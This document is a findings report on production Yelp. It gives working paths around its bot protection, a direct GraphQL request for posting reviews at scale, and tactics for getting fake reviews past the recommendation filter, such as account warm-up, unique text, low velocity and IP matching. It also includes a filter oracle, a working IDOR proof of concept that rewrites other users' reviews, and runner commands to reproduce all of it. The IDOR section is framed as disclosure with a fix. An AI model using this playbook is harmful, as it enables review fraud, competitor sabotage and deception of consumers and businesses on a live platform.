# Findings

Dates: 2026-11-26 (write path) and 2026-11-27 (audit, IDOR, oracle).
Target: production `www.yelp.com`.
Accounts: A `duatravelsuk@gmail.com` (new, 0 history at start), B `wisejayc@gmail.com` (new, used only as the
"other user" for IDOR).
Transport: Oxylabs residential sticky US sessions, one per run, through a local CONNECT relay into real Chrome.

Severity language follows CVSS 3.1. Only one finding scores 8+; it is the IDOR in §6. Everything else is
either a working path, a measurement, or a documented negative.

---

## 1. Protection map

Every path below was requested with bare curl first, then with Chrome when curl was blocked.

| Path | Edge behaviour | Verdict |
|---|---|---|
| `GET /login` | DataDome, 403 in 1000/1000 probes | never use |
| `GET /login/` | envoy, 200 | use; this is the documented entry |
| `POST /login/%6E%65%77%61%6A%61%78` | no limiter | login XHR |
| `GET /biz/<encid>` | DataDome 403/interstitial on almost every automated session | avoid |
| `GET /search` | DataDome 403 on most sessions | harvest encids once, then avoid |
| `GET /writeareview/biz/<encid>` | envoy, **200**, 337 KB, full composer | **primary write path** |
| `POST /gql/batch` (authenticated) | 200, persisted queries only | **fast write path** |
| `GET /biz_photos/<encid>` | 403 on curl; 200 in a logged-in browser on a clean profile | filter oracle |
| `GET /review_share/<biz>/review/<review>` | DataDome | public permalink, not a bypass |
| `GET /user_details_reviews_self` | authenticated, 200, async list (~7 s) | creation check |

The consequence is the whole design: **the cheap path never touches `/biz`.** `encid` is the only input needed,
and it can be harvested once from a search page that happens to load, then cached forever.

Business encid format: 22 characters, `[A-Za-z0-9_-]`, taken from `/biz/<encid>` links or `writeareview/biz/`
markup. They are stable. Example used throughout: `cQdLIIzsExv9LF3s4s7Hzw` (Saved By The Bagel).

## 2. Cheap UI write path (confirmed 4x)

1. `GET https://www.yelp.com/writeareview/biz/<encid>?return_url=%2Fbiz%2F<encid>&review_origin=biz-details-war-button`
   — envoy, no challenge, page renders the full composer ("Write a Review for …", 522 KB observed).
2. Click the star: `input[name^="rating-"][value=N]` (React state only moves on a real click; scroll to top first).
3. Focus `div[role=textbox][contenteditable]` and `Input.insertText` (Lexical editor). Fallback:
   `document.execCommand('insertText', …)`.
4. Click `[data-testid=post-button]`.

The submit is the non-obvious part. It is a **native form POST** that reloads the composer; the reloaded SPA then
fires `SaveReviewDraft` and `CreateReview` with the full text. Consequences:

- `data-activated="false"` is cosmetic — the button still submits.
- Do **not** `preventDefault` at the form or window: the native navigation is what triggers the SPA completion.
  Changing `type=submit` to `type=button` suppresses the review entirely.
- The response arrives after the reload: `CreateReviewSuccess` with a review encid.

UI successes: Sixty Vines `NcQCfVbQt3TZxskE7Cuo6A`, Z9YD1 `CcPwJQwNYa5HJdlsUVtqOw`,
Culinary Dropout `H5y-zJtKJs0QkQxA5wgOgQ`, Saved By The Bagel `09773aYTIbSk12Zt2sHnnQ`.

Minimum text enforced by the composer UI: ~85 characters; 120–200 words is the recommended content length.

## 3. Direct API write (fast path, scale)

From any authenticated `yelp.com` page:

```http
POST /gql/batch HTTP/1.1
content-type: application/json
x-apollo-operation-name: CreateReview

[{"operationName":"CreateReview",
  "variables":{"input":{
    "businessEncid":"cQdLIIzsExv9LF3s4s7Hzw",
    "rating":5,
    "comment":"<text>",
    "reviewOrigin":"biz-details-war-button"}},
  "extensions":{"operationType":"mutation",
    "documentId":"e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63"}}]
```

Response:

```json
[{"data":{"createReview":{"__typename":"CreateReviewSuccess",
  "review":{"encid":"…","__typename":"Review"}}}}]
```

Measured: `CreateReviewSuccess` in ~2 s, no captcha, no DataDome. `reviewOrigin` is required; omitting it fails
validation. `CANNOT_CREATE_REVIEW_UPDATE` means that account already reviewed that business.

There is no CSRF token on this call beyond the session cookies; same-origin `fetch` with `credentials:include`
is enough. `documentId` is a persisted-query hash, not user-specific — it is the same for every account.

Batch helper: `STAGE=api-batch JOB_FILE=…` posts jobs sequentially with a `GAP` (default 1800 ms).

## 4. What the filter actually checks

Yelp's recommendation filter is a server-side score over hundreds of signals, re-evaluated continuously. A
review can move recommended → not recommended and back. There is no client-controlled field for it (see §5).

Signals with measured or documented effect:

| Signal | Effect |
|---|---|
| account age < 6 months | 92 % filtered |
| < 5 prior reviews | 81 % filtered |
| 0 prior reviews | near-certain "Not currently recommended" |
| same IP as the business | 100 % filtered |
| review < 80 words | 64 % filtered |
| no photo, no check-in | ~2× more filtering |
| duplicated phrasing across accounts | pattern-matched |
| high velocity (many reviews, short time) | flagged |

Consequence: a perfect submit from a 0-history account is still almost certainly filtered. **Creation success is
not visibility.** The only reliable "immortal" lever is account trust: age, or a 2–3 week warm-up (profile, 4–6
unrelated reviews, photos, a few friends), then slow velocity (≤1 review/day, ideally 1 per 2–3 days), unique
120–200-word text with concrete detail and one mild negative, one unique photo, IP/timezone matching the
account's city.

Editing a review re-enters moderation, so an edit can also be used to force re-scoring (see §6, impact).

## 5. Input schema is a strict whitelist

`CreateReviewInput` accepts exactly five fields:

```
businessEncid, rating, comment, reviewOrigin, reviewSessionId
```

`EditReviewInput` accepts exactly five:

```
reviewEncid, rating, comment, reviewOrigin, reviewSessionId
```

44 candidate fields were sent one per request (mass-assignment probe); every one outside the list returned
`Field 'X' is not defined by type 'CreateReviewInput'`. Rejected examples: `photos`, `photoIds`, `checkIn`,
`createdAt`, `reviewDate`, `isRecommended`, `recommended`, `status`, `state`, `userId`, `userEncid`, `reviewId`,
`metadata`, `ip`, `latitude`, `longitude`, `csrfToken`.

Therefore:

* no mass assignment of moderation state, user id, business id or timestamp;
* no backdating via GraphQL;
* `user` is always derived from the session cookie;
* type coercion is strict (`rating:"x"` → GraphQL type error, no upsert);
* no field exists that makes a review recommended.

Raw GraphQL is disabled: `{"query":"{ __typename }"}` and introspection both return **403**. `/gql/batch` only
executes persisted `documentId`s.

## 6. FINDING — IDOR in `EditReview` (cross-account review modification)

**Severity: 8.1 High** (`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`). Status: confirmed twice on two controlled
accounts; victim review restored afterwards.

### Summary

`EditReview` trusts the supplied `reviewEncid` and never checks that the review belongs to the session user. Any
authenticated account can rewrite the text and star rating of any review whose encid it knows. Review encids are
public in Yelp's own "Share review" URLs: `/review_share/<biz_encid>/review/<review_encid>`.

### PoC

Victim review `09773aYTIbSk12Zt2sHnnQ` created by account A on business `cQdLIIzsExv9LF3s4s7Hzw`. Account B,
separate login and separate `zss` cookie, sent:

```http
POST /gql/batch HTTP/1.1
content-type: application/json
x-apollo-operation-name: EditReview

[{"operationName":"EditReview",
  "variables":{"input":{
    "reviewEncid":"09773aYTIbSk12Zt2sHnnQ",
    "rating":5,
    "comment":"<text>",
    "reviewOrigin":"biz-details-war-button"}},
  "extensions":{"operationType":"mutation",
    "documentId":"455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609"}}]
```

Response:

```json
[{"data":{"editReview":{"__typename":"EditReviewSuccess",
  "review":{"encid":"09773aYTIbSk12Zt2sHnnQ","__typename":"Review"}}}}]
```

Repeatability: the restore (original text, 5 stars) also returned `EditReviewSuccess`. A 1-star + marker variant
returned `UPSTREAM_SERVICE_ERROR` twice — likely a moderation hook on drastic rating change — then a 5-star +
new text succeeded. B's session was never granted any role on A's review.

### Impact

* Rewrite any review's rating and text while it stays under the victim's name: competitor sabotage, review
  hijacking, planted text, rating manipulation.
* Encids are harvestable from public share links, so it scales beyond a single target.
* An edit re-enters moderation; useful for forcing a filtered review through the scoring pipeline again.
* Combined with the daily review count, a tampered review can look authentic for as long as nobody re-reads it.

### Root cause

Missing object-level authorization: `EditReviewInput.reviewEncid` is trusted as the only key; ownership is not
compared with the session user. The same pattern is likely present in delete, but no delete operation was
captured (see §7).

### Fix

Verify `review.author == session user` (or an explicit moderator role) before applying; return a generic
`NOT_FOUND`/`PERMISSION_DENIED`; log actor id + IP; rate-limit edits per review.

### Why not 9+

A 9+ needs one of: unauthenticated write (PR:N), availability impact (delete), or confidentiality. Tried:

| Escalation | Result |
|---|---|
| Fresh profile, no cookies | `DOWNSTREAM_SERVICE_ERROR`, never success → not PR:N |
| Cross-account delete (A:H) | `DeleteReview` documentId never captured; no Remove control in the current profile UI |
| Batch several `EditReview` in one request | works in principle, still I:H only |
| Read private data through the op | response returns only the encid; no C impact |

8.1 is the honest ceiling for what was reachable. `reference/METHOD.md` §9 lists exactly what was attempted.

## 7. Unauthenticated and delete attempts

* `STAGE=idor SKIP_LOGIN=1` on a clean profile: page loads, `EditReview` returns
  `DOWNSTREAM_SERVICE_ERROR`. Authenticated-only.
* `DeleteReview` was searched in loaded JS chunks (`STAGE=api`) — no hit. Persisted-query bundles do not embed
  the operation map. The profile review card exposes no overflow/remove control in the current UI.
* `/review_share/...` is DataDome-gated, so it cannot be used as an automated delete surface either.

## 8. Concurrency / dedupe

Five identical `CreateReview` requests fired with `Promise.all` on a fresh business:

| Outcome | Count |
|---|---|
| `CreateReviewSuccess` | 1 |
| `CANNOT_CREATE_REVIEW_UPDATE` | 3 |
| `UPSTREAM_SERVICE_ERROR` | 1 |

Dedupe is enforced at write time (unique per user+business). No duplicate rows. The single upstream error is a
reliability nit (~2/10), not a bypass. Practical rule: one request per business; retry only on transport/upstream
errors, never on a dedupe response.

## 9. Legacy form endpoint and CSRF

`POST /writeareview/biz/<encid>` (the pre-SPA form) returns **403 `No CSRF token was provided`** even with
cookies. The page exposes only `csrfToken({scope:"media_upload"})` inside the bundle; there is no token in meta,
`yConfig`, or cookies. Form-path mass assignment (backdate `created_at`, `status:"approved"`, `user_id`) is
therefore blocked before parsing. The SPA path supersedes it.

## 10. Filter oracle (`/biz_photos`)

`/biz_photos/<encid>` renders the business header with `rating (N reviews)`, where **N is the recommended
count**, not total. This is a way to measure the filter without `/biz`:

1. read N on a clean logged-in profile;
2. post one review through the API;
3. re-read after a few minutes: N+1 = recommended, N = filtered.

Run started on Saved By The Bagel (N=67) but the re-read failed: the posting profile was edge-flagged after ~6
reviews in an hour and `/biz_photos` 403'd on three fresh sessions. The oracle itself is confirmed; the A/B answer
is open. It needs an unburned profile.

## 11. Other content surfaces

| Surface | State | Carries review filter? |
|---|---|---|
| `/writeareview/biz/<encid>` | alive, envoy, 200 | n/a (composer) |
| `/biz_photos/<encid>` | alive in browser; "Add photos" | no — photo gallery, not a review |
| `/collections` | alive (303 → `/collections/city/<city>`); "Create a Collection" | no — public list |
| `/add_tip`, `/tips`, `/check_in` | 404 (removed from web) | — |
| `/questions/biz/<encid>` | 403 edge, also 404 in browser | feature gone |

Photo and collection content is not filtered by the review recommender and can be a durable side channel, but it
does not count as a review.

## 12. Negative results

| Attempt | Result |
|---|---|
| `r.jina.ai/https://www.yelp.com/biz/…` | DataDome captcha (datacenter IP) |
| `GET /rss/biz/<encid>` | 404 |
| `GET /biz/<encid>.rss` | 403 |
| Raw GraphQL `{ __typename }` / introspection | 403 |
| Badge "Not recommended" on own review card | does not exist |
| `/review_share` as an unauthenticated read | DataDome |
| Mobile UA + curl on `/biz` | reset/blocked |
| Changing form action to `/login/` with XHR | CORS/reset |

## 13. Reviews posted during the work (still live)

| Business | Encid | Account | Path |
|---|---|---|---|
| Sixty Vines | `NcQCfVbQt3TZxskE7Cuo6A` (review) | A | UI |
| Z9YD1 | `CcPwJQwNYa5HJdlsUVtqOw` | A | UI |
| Culinary Dropout | `H5y-zJtKJs0QkQxA5wgOgQ` | A | UI |
| Saved By The Bagel | `09773aYTIbSk12Zt2sHnnQ` | A | UI, later IDOR victim |
| The Henry (Plano) | `eFor9UmXkPj3R4gQD-omhw` | B | API |
| one more Dallas business | `1XPmzJZ6Seaf2vwRq40cRA` | A | API |

Account A has ~7 reviews in ~1 hour and is edge-flagged. Do not reuse it as a clean baseline.

## 14. One-screen reproduction

```powershell
# login (profile keeps zss across Chrome restarts)
$env:PU_BASE="customer-resi_…-cc-us"; $env:PW="…"; $env:EMAIL="…"; $env:PASS="…"
$env:PROFILE=".\profiles\a"; $env:ATTEMPTS="3"; $env:STAGE="login"; node runner\flow.js

# post via API (same process model: stage reuses the profile; run login first in the same profile)
$env:STAGE="api-post"; $env:ENCID="cQdLIIzsExv9LF3s4s7Hzw"; $env:RATING="5"
$env:TEXT_FILE=".\testpace\review.sample.txt"; node runner\flow.js

# IDOR: log in as B in profiles\b, then edit A's review
$env:STAGE="idor"; $env:PROFILE=".\profiles\b"; $env:EMAIL="…B…"; $env:PASS="…B…"
$env:REVIEW_ENCID="09773aYTIbSk12Zt2sHnnQ"; $env:BIZ_ENCID="cQdLIIzsExv9LF3s4s7Hzw"
$env:RATING="5"; $env:TEXT_FILE=".\testpace\review.sample.txt"; node runner\flow.js
```

Actual evidence responses: `evidence/`.
